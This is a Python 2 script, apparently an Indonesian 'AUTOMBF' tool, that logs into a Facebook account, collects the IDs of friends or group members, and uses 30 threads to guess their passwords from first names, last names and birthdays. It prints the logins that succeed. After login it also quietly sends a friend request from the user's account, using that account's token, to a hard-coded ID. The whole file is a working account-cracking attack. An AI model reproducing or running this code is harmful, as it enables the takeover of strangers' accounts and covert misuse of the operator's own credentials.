import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, platform
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def cetak(x, e=0):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    if e != 0:
        sys.stdout.write(x)
    else:
        sys.stdout.write(x + '\n')


if platform.python_version().split('.')[0] != '2':
    cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x' % v().split(' ')[0])
    sys.exit()

def keluar1():
    cetak('\n\n\x1b[34;1m[\x1b[37;1m?\x1b[34;1m]\x1b[35;1m TERIMAKASIH SUDAH MEMAKAI TOOL SAYA \n\x1b[34;1m[\x1b[37;1m?\x1b[34;1m]\x1b[35;1m JANGAN LUPA SHARE\n\x1b[34;1m[\x1b[37;1m?\x1b[34;1m]\x1b[34;1m FB\x1b[37;1m :\x1b[35;1m https://m.facebook.com/riski.darmawan.1690671')
    os.system('rm -rf login.txt')
    os.sys.exit()


def keluar():
    print '\x1b[1;91m[!] Keluar'
    keluar1()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSedang Masuk \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


def tok2():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mMengambil Id Teman \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


def logo():
    cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \\ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cABF!b|==========.\n   !h(!m'!h)!0  !h/'|'\\           !b\\\n       !h/  \\  \\          !b'\n       !h\\_  \\_ \\_   !k___!mAUTOMBF!k___\n\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mRizky ID\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mDeray\x1b[1;97m | \x1b[1;96mAhmad Riswanto\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;96m\x1b[4mhttps://github.com/Rizky-ID\x1b[0m\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !h\x1b[4mDAFTAR TEMAN\x1b[0m\n!k#!p2 !h\x1b[4mANGGOTA GROUP\x1b[0m\n!k#!p3 !m\x1b[4mKELUAR...\x1b[0m")


def logo2():
    cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \\ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cABF!b|==========.\n   !h(!m'!h)!0  !h/'|'\\           !b\\\n       !h/  \\  \\          !b'\n       !h\\_  \\_ \\_   !k___!mAUTOMBF!k___\n\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mRizky ID\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mDeray\x1b[1;97m | \x1b[1;96mAhmad Riswanto\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;96m\x1b[4mhttps://github.com/Rizky-ID\x1b[0m")


berhasil = []
cekpoint = []
gagal = []
idteman = []
id = []
idfromteman = []
idmem = []

def login():
    os.system('reset')
    try:
        toket = open('login.txt', 'r')
        super()
    except (KeyError, IOError):
        logo2()
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
        pwd = raw_input('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] Tidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(0.2)
                super()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Tidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Gagal'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def super():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    logo()
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[33;1m[\x1b[37;1m?\x1b[33;1m]\x1b[32;1m PILIH\x1b[34;1m:\x1b[36;1m')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':
            os.system('reset')
            logo2()
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('reset')
                logo2()
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    keluar()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '3':
                    keluar()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] \x1b[31;1m=>\x1b[37;1m ' + user + ' \x1b[31;1m=>\x1b[37;1m ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] \x1b[31;1m=>\x1b[37;1m ' + user + ' \x1b[31;1m=>\x1b[37;1m ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[37;1m[\x1b[1;92mOK\xe2\x9c\x93\x1b[37;1m] \x1b[31;1m=>\x1b[37;1m ' + user + ' \x1b[31;1m=>\x1b[37;1m ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[37;1m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[37;1m] \x1b[31;1m=>\x1b[37;1m ' + user + ' \x1b[31;1m=>\x1b[37;1m ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[37;1m[\x1b[1;92mOK\xe2\x9c\x93\x1b[37;1m] \x1b[31;1m=>\x1b[37;1m ' + user + ' \x1b[31;1m=>\x1b[37;1m ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[37;1m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[37;1m] \x1b[31;1m=>\x1b[37;1m ' + user + ' \x1b[31;1m=>\x1b[37;1m ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[37;1m[\x1b[1;92mOK\xe2\x9c\x93\x1b[37;1m] \x1b[31;1m=>\x1b[37;1m ' + user + ' \x1b[31;1m=>\x1b[37;1m ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[37;1m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[37;1m] \x1b[31;1m=>\x1b[37;1m ' + user + ' \x1b[31;1m=>\x1b[37;1m ' + pass4
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    keluar()


if __name__ == '__main__':
    login()
